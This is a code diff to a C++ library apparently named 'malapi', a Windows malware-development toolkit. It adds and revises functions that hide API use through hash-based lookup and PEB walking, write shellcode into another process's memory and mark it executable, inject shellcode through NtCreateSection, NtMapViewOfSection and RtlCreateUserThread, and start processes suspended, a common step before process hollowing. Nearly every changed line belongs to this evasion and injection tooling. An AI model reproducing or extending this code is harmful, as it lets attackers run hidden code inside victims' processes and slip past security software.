@@ -3,28 +3,15 @@
 namespace malapi
 {
 	//
-	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
-	//
-	BOOL CheckFileExists(_In_ LPCSTR FullPath)
-	{
-		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr DWORD hash_getfileattributes = HashStringFowlerNollVoVariant1a("GetFileAttributes");
-
-		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
-		if (!kernel32) return NULL;
-		typeGetFileAttributesA _GetFileAttributesA = (typeGetFileAttributesA)GetProcAddressC(kernel32, hash_getfileattributes);
-		if (!_GetFileAttributesA) return NULL;
-
-		DWORD attribs = _GetFileAttributesA(FullPath);
-		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
-	}
-
-	//
-	// GetModuleHandle implementation with API hashing.
-	//
+// GetModuleHandle implementation with API hashing.
+//
 	HMODULE GetModuleHandleC(_In_ ULONG dllHash)
 	{
+#ifdef _WIN64
 		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList;
+#else // https://www.renenyffenegger.ch/notes/Windows/development/process/PEB
+		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readfsdword(0x30))->Ldr->InMemoryOrderModuleList;
+#endif
 		PLIST_ENTRY next = head->Flink;
 
 		PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16);
@@ -132,7 +119,7 @@ namespace malapi
 	//
 	HANDLE GetProcessHandle(DWORD process_id)
 	{
-		HANDLE process = NULL;
+		HANDLE process = INVALID_HANDLE_VALUE;
 		constexpr DWORD hash_krn32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr DWORD hash_openprocess = HashStringFowlerNollVoVariant1a("OpenProcess");
 
@@ -155,6 +142,38 @@ namespace malapi
 		LOG_SUCCESS("Process Handle: 0x%08lX", process);
 
 		return process;
+	}
+
+	//
+	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
+	//
+	BOOL CheckFileExists(_In_ LPCSTR FullPath)
+	{
+		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_getfileattributes = HashStringFowlerNollVoVariant1a("GetFileAttributes");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+		typeGetFileAttributesA _GetFileAttributesA = (typeGetFileAttributesA)GetProcAddressC(kernel32, hash_getfileattributes);
+		if (!_GetFileAttributesA) return NULL;
+
+		DWORD attribs = _GetFileAttributesA(FullPath);
+		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
+	}
+
+	//
+	// Close a given handle via ntdll.dll!NtClose.
+	//
+	VOID CloseHandle(_In_ HANDLE Handle)
+	{
+		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr DWORD hash_ntclose = HashStringFowlerNollVoVariant1a("NtClose");
+
+		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
+		if (!ntdll) return;
+		typeNtClose NtClose = (typeNtClose)GetProcAddressC(ntdll, hash_ntclose);
+
+		NtClose(Handle);
 	}
 
 	//
@@ -207,12 +226,12 @@ namespace malapi
 		}
 		else LOG_SUCCESS("Shellcode written to memory.");
 
-		if (!VirtualProtectEx(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READWRITE, &old_protection))
+		if (!VirtualProtectExC(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protection))
 		{
 			LOG_ERROR("Failed to change protection type (Code: %08lX)", GetLastErrorC());
 			return FALSE;
 		}
-		else LOG_SUCCESS("Protection changed to RWX.");
+		else LOG_SUCCESS("Protection changed to RX.");
 
 		return address_ptr;
 	}
@@ -325,7 +344,7 @@ namespace malapi
 #ifdef _WIN64
 		peb = reinterpret_cast<PTEB>(__readgsqword(0x30))->ProcessEnvironmentBlock;
 #else
-		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->processEnvironmentBlock;
+		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->ProcessEnvironmentBlock;
 #endif
 		return peb;
 	}
@@ -344,6 +363,26 @@ namespace malapi
 				return pchar;
 		}
 		return NULL;
+	}
+
+	//
+	// Gets the process cookie from the PEB
+	//
+	ULONG GetProcessCookie(void)
+	{
+		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr DWORD hash_NtQueryInformationProcess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
+
+		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
+		if (!ntdll) return NULL;
+		typeNtQueryInformationProcess NtQueryInformationProcess = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_NtQueryInformationProcess);
+		if (!NtQueryInformationProcess) return NULL;
+
+		// get process cookie
+		ULONG cookie = 0;
+		NTSTATUS result = NtQueryInformationProcess((HANDLE)-1, ProcessCookie, &cookie, sizeof(ULONG), NULL);
+
+		return NT_SUCCESS(result) ? cookie : NULL;
 	}
 
 	//
@@ -402,7 +441,7 @@ namespace malapi
 	//
 	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
 	//
-	VOID InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength)
+	BOOL InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength)
 	{
 		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr DWORD hash_ntcreatesection = HashStringFowlerNollVoVariant1a("NtCreateSection");
@@ -410,12 +449,12 @@ namespace malapi
 		constexpr DWORD hash_rtlcreateuserthread = HashStringFowlerNollVoVariant1a("RtlCreateUserThread");
 
 		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
-		if (!ntdll) return;
+		if (!ntdll) return FALSE;
 
 		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddressC(ntdll, hash_ntcreatesection);
 		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
 		typeRtlCreateUserThread RtlCreateUserThread = (typeRtlCreateUserThread)GetProcAddressC(ntdll, hash_rtlcreateuserthread);
-		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread) return;
+		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread) return FALSE;
 
 		LARGE_INTEGER section_size = { 0 };
 		HANDLE section_handle = NULL, target_thread = NULL;
@@ -477,6 +516,8 @@ namespace malapi
 			&target_thread,
 			NULL
 		);
+
+		return TRUE;
 	}
 
 	//
@@ -541,10 +582,10 @@ namespace malapi
 		return d;
 	}
 
+#if _WINDLL == 0 && !_DEBUG
 	//
 	// memcpy implementation.
 	//
-#if _WINDLL == 0 && !_DEBUG
 #pragma intrinsic(memcpy)
 #pragma function(memcpy)
 	void* __cdecl memcpy(void* dst, void const* src, size_t size) {
@@ -567,6 +608,85 @@ namespace malapi
 		return pTarget;
 	}
 #endif
+
+	//
+	// Wrapper around K32!CreateProcessW.
+	//
+	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory)
+	{
+		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_createprocessw = HashStringFowlerNollVoVariant1a("CreateProcessW");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);
+
+		STARTUPINFOW si;
+		PROCESS_INFORMATION pi;
+
+		// TODO: add macro in malapi.hpp
+		RtlZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+
+		BOOL success = CreateProcessW(
+			NULL,
+			command_line,
+			NULL,
+			NULL,
+			FALSE,
+			0,
+			NULL,
+			NULL,
+			&si,
+			&pi
+		);
+
+		if (!success) return NULL;
+
+		CloseHandle(pi.hThread);
+		return pi.hProcess;
+	}
+
+	//
+	// Create Suspended Process
+	// RETURN ProcessHandle
+	//
+	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path)
+	{
+		STARTUPINFOA si = {};
+		PROCESS_INFORMATION pi = {};
+		//PDWORD process_id;
+		//PHANDLE process_handle;
+		//PHANDLE thread_handle;
+
+#pragma region winapi_imports
+
+		typeCreateProcessA CreateProcessC = NULL;
+		typeCloseHandle CloseHandleC = NULL;
+
+		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
+		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+		CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
+
+#pragma endregion
+
+		RtlZeroMemory(&si, sizeof(STARTUPINFOA));
+		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+
+		si.cb = sizeof(STARTUPINFOA);
+
+		BOOL success = CreateProcessC(0, file_path, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+
+		if (!success) return NULL;
+
+		CloseHandleC(pi.hThread);
+		return pi.hProcess;
+	}
 
 	//
 	// String compare implementation (ascii).
@@ -639,15 +759,6 @@ namespace malapi
 		while ((*p++ = *String2++) != 0);
 
 		return String1;
-	}
-
-	//
-	// XORs input with a given key, will repeat the key if KeyLen < InputLen.
-	//
-	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
-	{
-		for (SIZE_T i = 0; i < InputLen; i++)
-			Input[i] ^= Key[i % KeyLen];
 	}
 
 	//
